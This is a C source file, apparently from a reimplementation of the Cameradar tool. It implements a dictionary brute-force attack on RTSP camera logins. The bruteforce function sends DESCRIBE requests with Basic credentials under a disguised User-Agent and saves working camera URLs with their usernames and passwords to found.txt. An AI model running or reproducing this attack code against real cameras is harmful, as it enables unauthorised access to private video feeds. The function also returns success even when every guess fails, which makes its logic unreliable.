/* socks.c
 * The socket and network function for Cameradar on C
 * SPDX-License-Identifier: GNU General Public License v3
 */

#include "cam.h"

int spawnSock (radarType* target)
{
  int sockfd;
  struct sockaddr_in addr;
  struct timeval timeout;

  sockfd = socket (AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) {
    sslog (false, COL_RED, "ERROR", "socket failed");
    return -1;
  }

  int flags = fcntl (sockfd, F_GETFL, 0);
  fcntl (sockfd, F_SETFL, flags | O_NONBLOCK);

  addr.sin_family = AF_INET;
  addr.sin_port = htons (target->port);
  addr.sin_addr.s_addr = target->ipAddr;

  connect (sockfd, (struct sockaddr*)&addr, sizeof (addr));

  fd_set wset;
  FD_ZERO (&wset);
  FD_SET (sockfd, &wset);

  struct timeval tv;
  tv.tv_sec = target->timeout_ms / 1000;
  tv.tv_usec = (target->timeout_ms % 1000) * 1000;

  int sel = select (sockfd + 1, NULL, &wset, NULL, &tv);

  if (sel <= 0) {
    close (sockfd);
    target->is_open = false;
    return -1;
  }

  int err = 0;
  socklen_t len = sizeof (err);
  getsockopt (sockfd, SOL_SOCKET, SO_ERROR, &err, &len);
  if (err != 0) {
    char msg[64];
    snprintf (msg, sizeof (msg), "Port %d refused: %s", target->port, strerror (err));
    sslog (true, COL_YLW, "SKIP", msg);
    close (sockfd);
    target->is_open = false;
    return -1;
  }

  fcntl (sockfd, F_SETFL, flags);

  timeout.tv_sec = target->timeout_ms / 1000;
  timeout.tv_usec = (target->timeout_ms % 1000) * 1000;
  setsockopt (sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof (timeout));
  setsockopt (sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof (timeout));

  target->is_open = true;
  sslog (true, COL_GRN, "OPEN", "Socket spawned on port %d", target->port);
  return sockfd;
}

bool bruteforce (radarType* target, Dictionary *logins, Dictionary *passwords)
{
  if (logins == null || passwords == null)
  {
    sslog (false, COL_RED, "ALERT", "Dictionary are empty!!!");
    return false;
  }

  char rawAu[256], bsfAu[512];
  char req[1024], resp[1024];

  struct in_addr addr = {.s_addr = target->ipAddr};
  char ip[INET_ADDRSTRLEN];
  inet_ntop (AF_INET, &addr, ip, sizeof (ip));

  int attempt = 0;

  for (int p = 0; p < 5; p++)
  {
    for (int l = 0; l < logins->count; l++)
    {
      string cur_login = logins->lines[l];

      for (int j = 0; j < passwords->count; j++)
      {
        string cur_pass = passwords->lines[j];
        attempt++;

        int fd = spawnSock (target);
        if (fd < 0) {
          usleep (100000);
          continue;
        }

        snprintf (rawAu, sizeof (rawAu), "%s:%s", cur_login, cur_pass);
        bsfEncode (rawAu, bsfAu);

        snprintf (req, sizeof (req),
                          "DESCRIBE rtsp://%s:%d%s RTSP/1.0\r\n"
                          "CSeq: 1\r\n"
                          "Authorization: Basic %s\r\n"
                          "User-Agent: googelbigeyegemini/1.0\r\n\r\n",
                          ip, target->port, rtspPath[p], bsfAu);

        send (fd, req, strnlen (req, sizeof req), 0);

        memset (resp, 0, sizeof (resp));
        int received = recv (fd, resp, sizeof(resp) - 1, 0);
        close (fd);

        if (received > 0 && strstr (resp, "RTSP/1.0 200"))
        {
          sslog (false, COL_GRN, "SUCCESS", "%s:%d%s -> %s:%s\n", ip, target->port, rtspPath[p], cur_login, cur_pass);
          FILE *res = fopen ("found.txt", "a");
          if (res)
          {
              fprintf (res, "rtsp://%s:%s@%s:%d%s\n", cur_login, cur_pass, ip, target->port, rtspPath[p]);
              fclose (res);
          }
          goto brute_success;
        }
        pthread_mutex_lock (&log_mutex);
        snprintf (globA.msg, 256, COL_BLU "\r[INFO] Brute Attempt #%d | %s:%s on %s, please wait." COL_DEF, attempt, cur_login, cur_pass, rtspPath[p]);
        pthread_mutex_unlock (&log_mutex);
        fflush (stdout);
        usleep (100000);
      }
    }
  }
  sslog (false, COL_YLW, "INFO", "Bruteforce completed: %d attempts, no valid credentials found", attempt);

  brute_success:
    return true;
}

